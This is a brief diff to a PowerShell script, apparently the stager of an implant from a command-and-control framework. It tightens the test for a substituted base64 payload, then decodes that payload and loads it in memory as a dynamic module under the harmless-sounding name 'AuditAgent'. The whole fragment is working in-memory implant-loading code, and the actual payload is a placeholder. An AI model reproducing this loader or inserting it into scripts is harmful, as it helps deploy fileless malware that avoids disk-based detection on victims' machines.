@@ -25,8 +25,8 @@ $ImplantId = '__IMPLANT_ID__'
 
 # ── Import AuditAgent Module ──────────────────────────────────────────────────
 $AuditAgentB64 = '__PSHAGENT_B64__'
-if ($AuditAgentB64 -ne '__PSHAGENT_B64__') {
-    # In-memory: decode and load as dynamic module
+if ($AuditAgentB64.Length -gt 100) {
+    # In-memory: decode and load as dynamic module (placeholder was replaced with base64)
     $bytes = [Convert]::FromBase64String($AuditAgentB64)
     $code = [Text.Encoding]::UTF8.GetString($bytes)
     New-Module -Name "AuditAgent" -ScriptBlock ([ScriptBlock]::Create($code)) | Import-Module
